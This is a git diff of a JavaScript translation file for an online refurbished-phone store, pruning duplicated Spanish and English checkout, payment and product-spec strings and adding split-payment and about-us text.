@@ -10,93 +10,26 @@ if (typeof countryConfig === 'undefined') {
         dominican: { flag: '🇩🇴', name: 'Dominican Republic', currency: 'DOP', rate: 58, lang: 'es', phone: '+1 809 234-5678' },
         usa: { flag: '🇺🇸', name: 'USA', currency: 'USD', rate: 1, lang: 'en', phone: '+1 415-762-3849' }
     };
-} 
+}
 
-// Translation (i18n) data - check if already defined to prevent duplicate declaration
-if (typeof window.translations === 'undefined') {
-    window.translations = {
+// Transdlation data - check if already defined to prevent duplicate declaration
+const translations = window.translations || {
     es: {
         home: "Inicio",
-		checkout: "Finalizar compra",
-summary: "Resumen",
-information: "Información",
-payment: "Pago",
-processing: "Procesando",
-confirmation: "Confirmación",
-verification: "Verificación",
-order_summary: "Resumen del pedido",
-free: "Gratis",
-qty: "Cant.",
-discount_code: "Código de descuento",
-enter_code_placeholder: "Ingresa el código de descuento",
-apply: "Aplicar",
-subtotal: "Subtotal",
-shipping: "Envío",
-cost_summary: "Resumen de costos",
-total: "Total",
-agree_to: "Acepto los",
-terms_and_conditions: "Términos y Condiciones",
-continue: "Continuar",
-shipping_info: "Información de envío",
-full_name: "Nombre completo",
-enter_full_name: "Ingresa tu nombre completo",
-phone_number: "Número de teléfono",
-phone_number_placeholder: "Ingresa tu número",
-country: "País",
-complete_address: "Dirección completa",
-complete_address_placeholder: "Calle, apartamento, etc.",
-address_help: "Asegúrate de que la dirección sea correcta para evitar problemas de entrega.",
-city: "Ciudad",
-postal_code: "Código postal",
-postal_code_placeholder: "Opcional",
-continue_to_payment: "Continuar al pago",
-back: "Atrás",
-payment_method: "Método de pago",
-bank_transfer: "Transferencia bancaria",
-credit_card: "Tarjeta de crédito",
-select_payment_method: "Selecciona un método de pago para continuar",
-bank_transfer_note: "Puedes pagar de forma segura mediante transferencia bancaria con seguimiento.",
-transfer_instructions: "Después de realizar la transferencia, por favor confirma tu pago abajo.",
-confirm_transfer: "Confirmar transferencia",
-card_details: "Detalles de la tarjeta",
-accepted: "Aceptadas",
-cardholder_name: "Nombre del titular",
-card_number: "Número de tarjeta",
-expiry_date: "Fecha de expiración",
-secure_ssl: "Encriptación SSL segura",
-process_payment: "Procesar pago",
-submitting_card_info: "Enviando información de la tarjeta",
-please_wait_card: "Por favor espera mientras procesamos tu tarjeta.",
-processing_payment: "Procesando pago",
-please_wait_payment: "Por favor espera mientras procesamos tu pago.",
-validating_payment_method: "Validando método de pago...",
-order_confirmed: "Pedido confirmado",
-order_processed_success: "Tu pedido ha sido procesado exitosamente.",
-order_number: "Número de pedido",
-estimated_delivery: "Entrega estimada",
-continue_shopping: "Seguir comprando",
-security_verification: "Verificación de seguridad",
-verify_payment: "Verificar pago",
-otp_instructions: "Ingresa el código de 6 dígitos enviado a tu teléfono.",
-code_expires_in: "El código expira en",
-resend_code: "Reenviar código",
-verify_code: "Verificar código",
-skip_otp: "Omitir verificación",
-invalid_code: "Código inválido. Inténtalo de nuevo.",
-accept_terms_alert: "Debes aceptar los términos y condiciones para continuar",
-invalid_card_number: "Número de tarjeta inválido. Debe tener 16 dígitos.",
-invalid_expiry_date: "Fecha de vencimiento inválida. Debe estar en formato MM/AA.",
-invalid_cvv: "CVV inválido. Debe tener 3 o 4 dígitos.",
-invalid_expiry_year: "El año de vencimiento debe ser 2025 o posterior.",
-card_expired: "La tarjeta ha expirado.",
-
         products: "Productos",
         about: "Acerca de",
         contact: "Contacto",
         hero_title: "La Mejor Tecnología al Mejor Precio",
+        split_payment: "Pago a Plazos",
+        split_payment_title: "Paga en Cuotas",
+        split_payment_desc: "Paga un depósito del 50% hoy y divide el resto hasta en 6 meses.",
+        about_us_title: "Sobre Nuestra Empresa",
+        about_us_p1: "¡Bienvenido a nuestra tienda en línea! Nos dedicamos a ofrecer los mejores productos y servicios a nuestros clientes. Nuestra misión es entregar calidad y valor en cada compra.",
+        our_team_title: "Nuestro Equipo",
+        our_team_p1: "Contamos con un equipo de profesionales dedicados y apasionados por lo que hacen, siempre listos para ayudarte.",
         hero_subtitle: "Descubre nuestra selección premium de dispositivos reacondicionados con garantía completa y soporte técnico especializado. Tecnología de calidad a precios excepcionales.",
         shop_now: "Comprar Ahora",
-        benefit_free_shipping: "Envío gratis y entrega al día siguiente",
+        benefit_free_shipping: "Envío Gratis",
         benefit_free_shipping_desc: "En todos los pedidos",
         benefit_warranty: "Garantía 1 Año",
         benefit_warranty_desc: "En todos los productos",
@@ -115,8 +48,8 @@ card_expired: "La tarjeta ha expirado.",
         accessories: "Accesorios",
         add_to_cart: "Agregar al Carrito",
         available_in: "Disponible en:",
-        free_shipping: "Envío gratis y entrega al día siguiente",
-        free_shipping_all: "Envío gratis y entrega al día siguiente en todos los pedidos",
+        free_shipping: "Envío gratis",
+        free_shipping_all: "Envío gratis en todos los pedidos",
         new: "¡Nuevo!",
         certified: "¡Certificado!",
         hot: "¡Popular!",
@@ -142,8 +75,8 @@ card_expired: "La tarjeta ha expirado.",
         account_number: "Número de Cuenta:",
         account_holder: "Titular de la Cuenta:",
         reference: "Referencia:",
-        transfer_instructions: "Realiza la transferencia por el monto total y envíanos una confirmación por WhatsApp para un envío más rápido.",
-        confirm_transfer: "Enviar confirmación de pago",
+        transfer_instructions: "Realiza la transferencia por el monto total y confirma cuando hayas completado el pago.",
+        confirm_transfer: "He realizado la transferencia",
         bank_name: "Banco:",
         card_details: "Detalles de la Tarjeta",
         accepted: "Aceptado:",
@@ -186,466 +119,24 @@ card_expired: "La tarjeta ha expirado.",
         code_expires: "El código expira en: ",
         resend_code: "Reenviar Código",
         verify_code: "Verificar Código",
-        spacegray: "Gris Espacial",
-		product_title: "Producto",
-        home: "Inicio",
-        products: "Productos",
-        quantity: "Cantidad:",
-        add_to_cart: "Agregar al Carrito",
-        continue_shopping: "Seguir Comprando",
-        warranty_title: "12 Meses de Garantía",
-        warranty_desc: "Garantía completa con soporte técnico incluido",
-        key_features: "Características Principales",
-        technical_specs: "Especificaciones Técnicas",
-        color: "Color",
-        available_in: "Disponible en:",
-        free_shipping: "Envío gratis a partir de $200",
-        free_shipping_all: "Envío gratis en todos los pedidos",
-        iphone16promax_name: "iPhone 16 Pro Max",
-        iphone_desc: "iPhone reacondicionado premium con rendimiento excelente. 95% de batería garantizada. Incluye 1 año de garantía y 30 días de devolución.",
-        iphone16_name: "iPhone 16",
-		samsung_desc: "Rendimiento potente con pantalla impresionante y batería duradera. Perfecto para trabajo, juegos y uso diario.",
-		 poco_desc: "Teléfono de alto rendimiento con pantalla fluida y batería duradera. Ideal para juegos y uso diario.",
-		xiaomi_desc: "Rendimiento confiable, batería duradera y pantalla nítida. Perfecto para uso diario y juegos.",
-		 airpods_desc: "Disfruta de audio espacial con seguimiento dinámico de la cabeza, resistencia al sudor y al agua, y hasta 6 horas de reproducción.", 
-		earphones_desc: "Auriculares con cable económicos, sonido claro, diseño ligero y compatibilidad universal.",
-		jbl_speakerss_desc:"Altavoces JBL portátiles y resistentes al agua, con bajos potentes y conexión Bluetooth para llevar la música a todas partes.",
-		jbl_headphones_desc:"Sonido potente JBL con graves profundos, diseño cómodo y batería de larga duración para escuchar todo el día.",
-        choose_type: "Elegir tipo", 
-        new: "Nuevo!",
-        // Footer
-        company_info: "Información de la Empresa",
-        quick_links: "Enlaces Rápidos",
-        policies: "Políticas",
-        payment_methods: "Métodos de Pago",
-        payment_info: "Aceptamos transferencias bancarias, depósitos y pagos contra entrega en efectivo.",
-        rights_reserved: "Todos los derechos reservados.",
-        about: "Acerca de Nosotros",
-        contact: "Contacto",
-        support: "Soporte Técnico",
-        warranty: "Garantía",
-        privacy: "Privacidad",
-        terms: "Términos y Condiciones",
-        returns: "Devoluciones",
-        shipping_policy: "Envíos",
-        // Cart
-        shopping_cart: "Carrito de Compras",
-        empty_cart: "Tu carrito está vacío",
-        subtotal: "Subtotal:",
-        shipping: "Envío:",
-        total: "Total:",
-        checkout: "Proceder al Pago",
-        storage: "Almacenamiento",
-        condition: "Condición",
-        required: "*Requerido",
-        condition_guide: "Guía de Condición:",
-        condition_guide_desc: "Mejores condiciones indican menos desgaste y una apariencia superior del dispositivo.",
-         good: "Bueno",
-        good_desc: "Desgaste moderado, funciona perfectamente",
-        great: "Genial",
-        great_desc: "Desgaste ligero, totalmente funcional",
-        excellent: "Excelente",
-        excellent_desc: "Signos menores de uso",
-        pristine: "Impecable",
-        pristine_desc: "Como nuevo - sin desgaste visible",
-        search_products: "Buscar productos...",
-        invalid_code: "Código inválido. Por favor, inténtalo de nuevo.",
-		    add_to_cart: "Añadir al carrito",
-    buy_now: "Comprar ahora",
-		
-    product_description: "Descripción del producto",
-    specifications: "Especificaciones",
-    model: "Modelo",
-    storage: "Almacenamiento",
-    color: "Color",
-    condition: "Condición",
-    warranty: "Garantía",
-    free_shipping: "Envío gratis",
-    delivery_time: "Tiempo de entrega",
-    days_return: "Política de devolución de 14 días",
-    secure_payment: "Pago seguro",
-    excellent: "Excelente",
-    excellent_desc: "Pequeños signos de uso",
-    pristine: "Impecable",
-    pristine_desc: "Como nuevo - sin desgaste visible",
-    search_products: "Buscar productos...",
-    invalid_code: "Código inválido. Inténtalo de nuevo.",
-		battery: "Batería",
-    operating_system: "Sistema Operativo",
-    screen_size: "Tamaño de pantalla",
-    camera: "Cámara",
-    processor: "Procesador",
-    ram: "RAM",
-    storage: "Almacenamiento",
-    color: "Color",
-    condition: "Condición",
-    warranty: "Garantía",
-    free_shipping: "Envío gratis",
-    delivery_time: "Tiempo de entrega",
-    days_return: "Política de devolución de 14 días",
-    model: "Modelo",
-    specifications: "Especificaciones",
-    product_description: "Descripción del producto",
-    add_to_cart: "Añadir al carrito",
-    buy_now: "Comprar ahora",
-    invalid_code: "Código inválido. Por favor, inténtalo de nuevo.",
-    search_products: "Buscar productos...",
-    pristine_desc: "Como nuevo - sin desgaste visible",
-		color_black: "Negro",
-color_rose_gold: "Oro Rosa",
-color_black: "Negro",
-color_rose_gold: "Oro Rosa",
-
-condition_great: "Excelente",
-condition_great_desc: "Ligeros signos de uso, totalmente funcional",
-condition_excellent: "Muy Bueno",
-condition_excellent_desc: "Signos mínimos de uso",
-condition_display_piece: "Pieza de exhibición, sin uso",
-condition_display_piece_desc: "Pieza de exhibición, sin uso, caja abierta",
-
-iphone_feature_battery_title: "Batería de 29h",
-iphone_feature_battery_desc: "Reproducción de video",
-
-iphone_feature_chip_title: "Chip A18 Pro",
-iphone_feature_chip_desc: "Rendimiento revolucionario",
-
-iphone_feature_camera_title: "Cámara de 48MP",
-iphone_feature_camera_desc: "Sistema de cámaras Pro",
-
-iphone_feature_display_title: "6.9\" ProMotion",
-iphone_feature_display_desc: "Super Retina XDR",
-
-spec_display: "Pantalla",
-spec_processor: "Procesador",
-spec_storage: "Almacenamiento",
-spec_ram: "RAM",
-spec_main_camera: "Cámara Principal",
-spec_ultrawide_camera: "Cámara Ultra Ancha",
-spec_telephoto_camera: "Cámara Teleobjetivo",
-spec_battery: "Batería",
-spec_os: "Sistema Operativo",
-spec_connectivity: "Conectividad",
-spec_resistance: "Resistencia al Agua y Polvo",
-spec_dimensions: "Dimensiones",
-spec_weight: "Peso",
-spec_condition: "Estado",
-spec_battery_health: "Salud de Batería",
-spec_battery_health_value: "90% garantizada",
-spec_condition_certified: "Reacondicionado certificado",
-iphone16promax_name: "iPhone 16 Pro Max",
-galaxys25ultra_name: "Samsung Galaxy S25 Ultra",
-galaxys24ultra_name: "Samsung Galaxy S24 Ultra",
-galaxys24plus_name: "Samsung Galaxy S24 Plus",
-galaxys23ultra_name: "Samsung Galaxy S23 Ultra",
-galaxys22ultra_name: "Samsung Galaxy S22 Ultra",
-
-samsung_desc: "Rendimiento potente con pantalla impresionante y batería duradera. Perfecto para trabajo, juegos y uso diario.",
-premium: "¡Premium!",
-top_rated: "¡Más valorado!",
-popular: "¡Popular!",
-feature_battery_title: "Gran duración de batería",
-feature_battery_desc: "Rendimiento durante todo el día",
-feature_chip_title: "Procesador potente",
-feature_chip_desc: "Rápido y eficiente",
-feature_camera_title: "Cámara de alta resolución",
-feature_camera_desc: "Excelente calidad fotográfica",
-feature_display_title: "Pantalla nítida",
-feature_display_desc: "Visuales claros",
-
-iphone16_name: "iPhone 16",
-iphone15promax_name: "iPhone 15 Pro Max",
-iphone16e_name: "iPhone 16 e",
-iphone15_name: "iPhone 15",
-iphone14promax_name: "iPhone 14 Pro Max",
-iphone13promax_name: "iPhone 13 Pro Max",
-iphone12promax_name: "iPhone 12 Pro Max",
-iphone11promax_name: "iPhone 11 Pro Max",
-iphonexr_name: "iPhone XR",
-
-new: "¡Nuevo!",
-certified: "¡Certificado!",
-hot: "¡Popular!",
-bestseller: "¡Más vendido!",
-deal: "¡Oferta!",
-value: "¡Gran valor!",
-
-choose_type: "Elegir tipo",
-galaxya545g_name: "Samsung Galaxy A54 5G",
-galaxya35_name: "Samsung Galaxy A35",
-galaxya155g_name: "Samsung Galaxy A15 5G",
-galaxya05s_name: "Samsung Galaxy A05s",
-galaxym15_name: "Samsung Galaxy M15",
-galaxym14_name: "Samsung Galaxy M14",
-
-color_peach: "Durazno",
-color_green: "Verde",
-color_blue: "Azul",
-color_copper: "Cobre",
-redmi14c_name: "Xiaomi Redmi 14C",
-redminote14pro5g_name: "Xiaomi Redmi Note 14 Pro 5G",
-pocox7pro_name: "Xiaomi Poco X7 Pro",
-
-color_midnight_black: "Negro Medianoche",
-color_sage_green: "Verde Salvia",
-
-feature_processor_title: "Procesador eficiente",
-feature_processor_desc: "Equilibrio entre rendimiento y batería",
-airpods3_name: "AirPods 3ª Generación",
-airpods4_name: "AirPods 4ª Generación",
-earphones_name: "Auriculares Genéricos",
-jblheadphones_name: "Auriculares JBL",
-jblgo_name: "Altavoz JBL GO",
-jblpulse_name: "Altavoz JBL Pulse",
-cableiphone_name: "Cable de Carga para iPhone",
-cableusbc_name: "Cable de Carga USB‑C",
-
-feature_spatial_audio: "Audio Espacial",
-feature_spatial_audio_desc: "Sonido envolvente 3D",
-feature_h1_chip: "Chip H1",
-feature_h1_chip_desc: "Emparejamiento rápido y voz",
-feature_ipx4: "Resistencia IPX4 al agua",
-feature_ipx4_desc: "Diseño resistente a salpicaduras",
-feature_battery_airpods3_desc: "Hasta 6 h de audio o 30 h con estuche",
-feature_h2_chip: "Chip H2",
-feature_h2_chip_desc: "Mejor rendimiento y sonido",
-feature_noise_cancellation: "Cancelación de Ruido Activa",
-feature_noise_cancellation_desc: "Bloquea el sonido exterior",
-feature_ip54: "Resistencia al Agua y Polvo IP54",
-feature_battery_airpods4_desc: "Hasta 5 h de audio o 30 h con estuche",
-feature_tough_build: "Construcción Robusta",
-feature_tough_build_desc: "Barato y resistente",
-feature_clear_sound: "Sonido Claro",
-feature_clear_sound_desc: "Buen audio para llamadas y música",
-feature_wireless: "Conectividad Inalámbrica",
-feature_wireless_desc: "Comodidad Bluetooth",
-feature_jbl_sound: "Sonido JBL Característico",
-feature_jbl_sound_desc: "Audio rico y claro",
-feature_portable: "Ultra-portátil",
-feature_portable_desc: "Fácil de llevar",
-feature_led_lights: "Luces LED",
-feature_led_lights_desc: "Efectos visuales con la música",
-feature_mfi: "Certificado MFi",
-feature_mfi_desc: "Accesorios aprobados por Apple",
-feature_fast_charge: "Carga Rápida",
-feature_fast_charge_desc: "Recarga veloz",
-
-
-
-condition_great: "Excelente",
-condition_great_desc: "Ligeros signos de uso, totalmente funcional",
-condition_excellent: "Muy Bueno",
-condition_excellent_desc: "Signos mínimos de uso",
-condition_display_piece: "Pieza de exhibición, sin uso",
-condition_display_piece_desc: "Pieza de exhibición, sin uso, caja abierta",
-
-iphone_feature_battery_title: "Batería de 29h",
-iphone_feature_battery_desc: "Reproducción de video",
-
-iphone_feature_chip_title: "Chip A18 Pro",
-iphone_feature_chip_desc: "Rendimiento revolucionario",
-
-iphone_feature_camera_title: "Cámara de 48MP",
-iphone_feature_camera_desc: "Sistema de cámaras Pro",
-
-iphone_feature_display_title: "6.9\" ProMotion",
-iphone_feature_display_desc: "Super Retina XDR",
-
-spec_display: "Pantalla",
-spec_processor: "Procesador",
-spec_storage: "Almacenamiento",
-spec_ram: "RAM",
-spec_main_camera: "Cámara Principal",
-spec_ultrawide_camera: "Cámara Ultra Ancha",
-spec_telephoto_camera: "Cámara Teleobjetivo",
-spec_battery: "Batería",
-spec_os: "Sistema Operativo",
-spec_connectivity: "Conectividad",
-spec_resistance: "Resistencia al Agua y Polvo",
-spec_dimensions: "Dimensiones",
-spec_weight: "Peso",
-spec_condition: "Estado",
-spec_battery_health: "Salud de Batería",
-spec_battery_health_value: "90% garantizada",
-spec_condition_certified: "Reacondicionado certificado",
-iphone16promax_name: "iPhone 16 Pro Max",
-galaxys25ultra_name: "Samsung Galaxy S25 Ultra",
-galaxys24ultra_name: "Samsung Galaxy S24 Ultra",
-galaxys24plus_name: "Samsung Galaxy S24 Plus",
-galaxys23ultra_name: "Samsung Galaxy S23 Ultra",
-galaxys22ultra_name: "Samsung Galaxy S22 Ultra",
-
-samsung_desc: "Rendimiento potente con pantalla impresionante y batería duradera. Perfecto para trabajo, juegos y uso diario.",
-premium: "¡Premium!",
-top_rated: "¡Más valorado!",
-popular: "¡Popular!",
-feature_battery_title: "Gran duración de batería",
-feature_battery_desc: "Rendimiento durante todo el día",
-feature_chip_title: "Procesador potente",
-feature_chip_desc: "Rápido y eficiente",
-feature_camera_title: "Cámara de alta resolución",
-feature_camera_desc: "Excelente calidad fotográfica",
-feature_display_title: "Pantalla nítida",
-feature_display_desc: "Visuales claros",
-
-iphone16_name: "iPhone 16",
-iphone15promax_name: "iPhone 15 Pro Max",
-iphone16e_name: "iPhone 16 e",
-iphone15_name: "iPhone 15",
-iphone14promax_name: "iPhone 14 Pro Max",
-iphone13promax_name: "iPhone 13 Pro Max",
-iphone12promax_name: "iPhone 12 Pro Max",
-iphone11promax_name: "iPhone 11 Pro Max",
-iphonexr_name: "iPhone XR",
-
-new: "¡Nuevo!",
-certified: "¡Certificado!",
-hot: "¡Popular!",
-bestseller: "¡Más vendido!",
-deal: "¡Oferta!",
-value: "¡Gran valor!",
-
-choose_type: "Elegir tipo",
-galaxya545g_name: "Samsung Galaxy A54 5G",
-galaxya35_name: "Samsung Galaxy A35",
-galaxya155g_name: "Samsung Galaxy A15 5G",
-galaxya05s_name: "Samsung Galaxy A05s",
-galaxym15_name: "Samsung Galaxy M15",
-galaxym14_name: "Samsung Galaxy M14",
-
-color_peach: "Durazno",
-color_green: "Verde",
-color_blue: "Azul",
-color_copper: "Cobre",
-redmi14c_name: "Xiaomi Redmi 14C",
-redminote14pro5g_name: "Xiaomi Redmi Note 14 Pro 5G",
-pocox7pro_name: "Xiaomi Poco X7 Pro",
-
-color_midnight_black: "Negro Medianoche",
-color_sage_green: "Verde Salvia",
-
-feature_processor_title: "Procesador eficiente",
-feature_processor_desc: "Equilibrio entre rendimiento y batería",
-airpods3_name: "AirPods 3ª Generación",
-airpods4_name: "AirPods 4ª Generación",
-earphones_name: "Auriculares Genéricos",
-jblheadphones_name: "Auriculares JBL",
-jblgo_name: "Altavoz JBL GO",
-jblpulse_name: "Altavoz JBL Pulse",
-cableiphone_name: "Cable de Carga para iPhone",
-cableusbc_name: "Cable de Carga USB‑C",
-
-feature_spatial_audio: "Audio Espacial",
-feature_spatial_audio_desc: "Sonido envolvente 3D",
-feature_h1_chip: "Chip H1",
-feature_h1_chip_desc: "Emparejamiento rápido y voz",
-feature_ipx4: "Resistencia IPX4 al agua",
-feature_ipx4_desc: "Diseño resistente a salpicaduras",
-feature_battery_airpods3_desc: "Hasta 6 h de audio o 30 h con estuche",
-feature_h2_chip: "Chip H2",
-feature_h2_chip_desc: "Mejor rendimiento y sonido",
-feature_noise_cancellation: "Cancelación de Ruido Activa",
-feature_noise_cancellation_desc: "Bloquea el sonido exterior",
-feature_ip54: "Resistencia al Agua y Polvo IP54",
-feature_battery_airpods4_desc: "Hasta 5 h de audio o 30 h con estuche",
-feature_tough_build: "Construcción Robusta",
-feature_tough_build_desc: "Barato y resistente",
-feature_clear_sound: "Sonido Claro",
-feature_clear_sound_desc: "Buen audio para llamadas y música",
-feature_wireless: "Conectividad Inalámbrica",
-feature_wireless_desc: "Comodidad Bluetooth",
-feature_jbl_sound: "Sonido JBL Característico",
-feature_jbl_sound_desc: "Audio rico y claro",
-feature_portable: "Ultra-portátil",
-feature_portable_desc: "Fácil de llevar",
-feature_led_lights: "Luces LED",
-feature_led_lights_desc: "Efectos visuales con la música",
-feature_mfi: "Certificado MFi",
-feature_mfi_desc: "Accesorios aprobados por Apple",
-feature_fast_charge: "Carga Rápida",
-feature_fast_charge_desc: "Recarga veloz"
-			
+        invalid_code: "Código inválido. Por favor, inténtalo de nuevo."
     },
     en: {
         home: "Home",
-		checkout: "Checkout",
-summary: "Summary",
-information: "Information",
-payment: "Payment",
-processing: "Processing",
-confirmation: "Confirmation",
-verification: "Verification",
-order_summary: "Order Summary",
-free: "Free",
-qty: "Qty",
-discount_code: "Discount Code",
-enter_code_placeholder: "Enter discount code",
-apply: "Apply",
-subtotal: "Subtotal",
-shipping: "Shipping",
-cost_summary: "Cost Summary",
-total: "Total",
-agree_to: "I agree to the",
-terms_and_conditions: "Terms and Conditions",
-continue: "Continue",
-shipping_info: "Shipping Information",
-full_name: "Full Name",
-enter_full_name: "Enter your full name",
-phone_number: "Phone Number",
-phone_number_placeholder: "Enter your phone number",
-country: "Country",
-complete_address: "Complete Address",
-complete_address_placeholder: "Enter street, apartment, etc.",
-address_help: "Make sure your address is accurate to avoid delivery issues.",
-city: "City",
-postal_code: "Postal Code",
-postal_code_placeholder: "Optional",
-continue_to_payment: "Continue to Payment",
-back: "Back",
-payment_method: "Payment Method",
-bank_transfer: "Bank Transfer",
-credit_card: "Credit Card",
-select_payment_method: "Select a payment method to continue",
-bank_transfer_note: "You can pay safely via bank transfer with order tracking.",
-transfer_instructions: "After completing the bank transfer, please confirm your payment below.",
-confirm_transfer: "Confirm Bank Transfer",
-card_details: "Card Details",
-accepted: "Accepted",
-cardholder_name: "Cardholder Name",
-card_number: "Card Number",
-expiry_date: "Expiry Date",
-secure_ssl: "Secure SSL Encryption",
-process_payment: "Process Payment",
-submitting_card_info: "Submitting Card Information",
-please_wait_card: "Please wait while we securely process your card.",
-processing_payment: "Processing Payment",
-please_wait_payment: "Please wait while we process your payment.",
-validating_payment_method: "Validating payment method...",
-order_confirmed: "Order Confirmed",
-order_processed_success: "Your order has been successfully processed.",
-order_number: "Order Number",
-estimated_delivery: "Estimated Delivery",
-continue_shopping: "Continue Shopping",
-security_verification: "Security Verification",
-verify_payment: "Verify Payment",
-otp_instructions: "Please enter the 6-digit code sent to your phone.",
-code_expires_in: "Code expires in",
-resend_code: "Resend Code",
-verify_code: "Verify Code",
-skip_otp: "Skip Verification",
-invalid_code: "Invalid code. Please try again.",
-invalid_card_number: "Invalid card number. Must be 16 digits.",
-invalid_expiry_date: "Invalid expiry date. Must be in MM/YY format.",
-invalid_cvv: "Invalid CVV. Must be 3 or 4 digits.",
-invalid_expiry_year: "Expiry year must be 2025 or later.",
-card_expired: "Card has expired.",
-
         products: "Products",
         about: "About",
         contact: "Contact",
         hero_title: "The Best Technology at the Best Price",
+        split_payment: "Split Payment",
+        split_payment_title: "Pay in Installments",
+        split_payment_desc: "Pay a 50% deposit today and split the rest over up to 6 months.",
+        about_us_title: "About Our Company",
+        about_us_p1: "Welcome to our e-shop! We are dedicated to providing the best products and services to our customers. Our mission is to deliver quality and value with every purchase.",
+        our_team_title: "Our Team",
+        our_team_p1: "We have a dedicated team of professionals who are passionate about what they do and are always here to help you.",
         hero_subtitle: "Discover our premium selection of refurbished devices with full warranty and specialized technical support. Quality technology at exceptional prices.",
         shop_now: "Shop Now",
-        benefit_free_shipping: "Free Shipping and next day delivery",
+        benefit_free_shipping: "Free Shipping",
         benefit_free_shipping_desc: "On all orders",
         benefit_warranty: "1 Year Warranty",
         benefit_warranty_desc: "On all products",
@@ -664,8 +155,8 @@ card_expired: "Card has expired.",
         accessories: "Accessories",
         add_to_cart: "Add to Cart",
         available_in: "Available in:",
-        free_shipping: "Free Shipping and Next day delivery",
-        free_shipping_all: "Free shipping and next day delivery on all orders",
+        free_shipping: "Free Shipping",
+        free_shipping_all: "Free shipping on all orders",
         new: "New!",
         certified: "Certified!",
         hot: "Hot!",
@@ -691,8 +182,8 @@ card_expired: "Card has expired.",
         account_number: "Account Number:",
         account_holder: "Account Holder:",
         reference: "Reference:",
-        transfer_instructions: "Make the transfer for the total amount and send us a confirmation via whatsapp for expedited shipping.",
-        confirm_transfer: "Send Payment Confirmation",
+        transfer_instructions: "Make the transfer for the total amount and confirm when you have completed the payment.",
+        confirm_transfer: "I have made the transfer",
         bank_name: "Bank:",
         card_details: "Card Details",
         accepted: "Accepted:",
@@ -735,277 +226,9 @@ card_expired: "Card has expired.",
         code_expires: "Code expires in: ",
         resend_code: "Resend Code",
         verify_code: "Verify Code",
-		accept_terms_alert: "You must accept the terms and conditions to continue",
-	product_title: "Product",
-        home: "Home",
-        products: "Products",
-        quantity: "Quantity:",
-        add_to_cart: "Add to Cart",
-        continue_shopping: "Continue Shopping",
-        warranty_title: "12 Month Warranty",
-        warranty_desc: "Full warranty with technical support included",
-        key_features: "Key Features",
-        technical_specs: "Technical Specifications",
-        color: "Color",
-        available_in: "Available in:",
-        free_shipping: "Free shipping on orders over $200",
-        free_shipping_all: "Free shipping on all orders",
-		 iphone16promax_name: "iPhone 16 Pro Max",
-        iphone_desc: "Premium refurbished iPhone with excellent performance. 95% battery health guaranteed. Includes 1 year warranty and 30-day return.",
-        iphone16_name: "iPhone 16",
-         airpods_desc: "Enjoy spatial audio with dynamic head tracking, sweat and water resistance, and up to 6 hours of listening time.",
-		earphones_desc: "Affordable wired earphones with clear sound, lightweight design, and universal compatibility.",
-		 xiaomi_desc: "Reliable performance, long-lasting battery, and sharp display. Perfect for daily use and gaming.",
-		jbl_speakerss_desc:"Portable JBL speakers with waterproof design, powerful bass, and Bluetooth connectivity for music anywhere.",
-		poco_desc: "High-performance phone with smooth display and strong battery life. Ideal for gaming and everyday use.",
-		jbl_headphones_desc:"Powerful JBL sound with deep bass, comfortable design, and long-lasting battery for all-day listening.",
-		 samsung_desc: "Powerful performance with stunning display and long-lasting battery. Perfect for work, gaming, and everyday use.",
-        choose_type: "Choose Type",
-        new: "New!",
-        // Footer
-        company_info: "Company Information",
-        quick_links: "Quick Links",
-        policies: "Policies",
-        payment_methods: "Payment Methods",
-        payment_info: "We accept bank transfers, deposits and cash on delivery payments.",
-        rights_reserved: "All rights reserved.",
-        about: "About Us",
-        contact: "Contact",
-        support: "Technical Support",
-        warranty: "Warranty",
-        privacy: "Privacy",
-        terms: "Terms and Conditions",
-        returns: "Returns",
-        shipping_policy: "Shipping",
-        // Product page specific
-        storage: "Storage",
-        condition: "Condition",
-        required: "*Required",
-        condition_guide: "Condition Guide:",
-        condition_guide_desc: "Better conditions indicate less wear and superior device appearance.",
-        // Cart
-        shopping_cart: "Shopping Cart",
-        empty_cart: "Your cart is empty",
-        subtotal: "Subtotal:",
-        shipping: "Shipping:",
-        total: "Total:",
-        checkout: "Proceed to Checkout",
-         good: "Good",
-        good_desc: "Moderate wear, works perfectly",
-        great: "Great",
-        great_desc: "Light wear, fully functional",
-        excellent: "Excellent",
-        excellent_desc: "Minor signs of use",
-        pristine: "Pristine",
-        pristine_desc: "Like new - no visible wear",
-        search_products: "Search products...",
-        invalid_code: "Invalid code. Please try again.",
-		 add_to_cart: "Add to Cart",
-    buy_now: "Buy Now",
-    product_description: "Product Description",
-    specifications: "Specifications",
-    model: "Model",
-    storage: "Storage",
-    color: "Color",
-    condition: "Condition",
-    warranty: "Warranty",
-    free_shipping: "Free Shipping",
-    delivery_time: "Delivery Time",
-    days_return: "14-day Return Policy",
-    secure_payment: "Secure Payment",
-    excellent: "Excellent",
-    excellent_desc: "Minor signs of use",
-    pristine: "Pristine",
-    pristine_desc: "Like new - no visible wear",
-    search_products: "Search products...",
-    invalid_code: "Invalid code. Please try again.",
-		battery: "Battery",
-    operating_system: "Operating System",
-    screen_size: "Screen Size",
-    camera: "Camera",
-    processor: "Processor",
-    ram: "RAM",
-    storage: "Storage",
-    color: "Color",
-    condition: "Condition",
-    warranty: "Warranty",
-    free_shipping: "Free Shipping",
-    delivery_time: "Delivery Time",
-    days_return: "14-Day Return Policy",
-    model: "Model",
-    specifications: "Specifications",
-    product_description: "Product Description",
-    add_to_cart: "Add to Cart",
-    buy_now: "Buy Now",
-    invalid_code: "Invalid code. Please try again.",
-    search_products: "Search products...",
-    pristine_desc: "Like new - no visible wear",
-		color_black: "Black",
-color_rose_gold: "Rose Gold",
-
-condition_great: "Great",
-condition_great_desc: "Light wear, fully functional",
-condition_excellent: "Excellent",
-condition_excellent_desc: "Minor signs of use",
-condition_display_piece: "Display piece, never used",
-condition_display_piece_desc: "Display piece, never used, open box",
-
-iphone_feature_battery_title: "29h Battery",
-iphone_feature_battery_desc: "Video playback",
-
-iphone_feature_chip_title: "A18 Pro Chip",
-iphone_feature_chip_desc: "Revolutionary performance",
-
-iphone_feature_camera_title: "48MP Camera",
-iphone_feature_camera_desc: "Pro camera system",
-
-iphone_feature_display_title: "6.9\" ProMotion",
-iphone_feature_display_desc: "Super Retina XDR",
-
-spec_display: "Display",
-spec_processor: "Processor",
-spec_storage: "Storage",
-spec_ram: "RAM",
-spec_main_camera: "Main Camera",
-spec_ultrawide_camera: "Ultra Wide Camera",
-spec_telephoto_camera: "Telephoto Camera",
-spec_battery: "Battery",
-spec_os: "Operating System",
-spec_connectivity: "Connectivity",
-spec_resistance: "Water & Dust Resistance",
-spec_dimensions: "Dimensions",
-spec_weight: "Weight",
